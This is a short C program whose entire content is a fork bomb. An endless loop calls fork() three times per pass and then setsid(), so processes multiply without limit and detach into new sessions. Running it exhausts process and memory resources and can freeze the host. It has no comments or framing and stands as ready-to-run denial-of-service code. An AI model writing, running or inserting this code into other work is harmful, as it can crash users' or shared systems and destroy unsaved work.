#include <stdio.h>
#include <unistd.h>

int main() {
    int id;
  while (1){
    id = fork();
    id = fork();
    id = fork();
    setsid();

  }
}
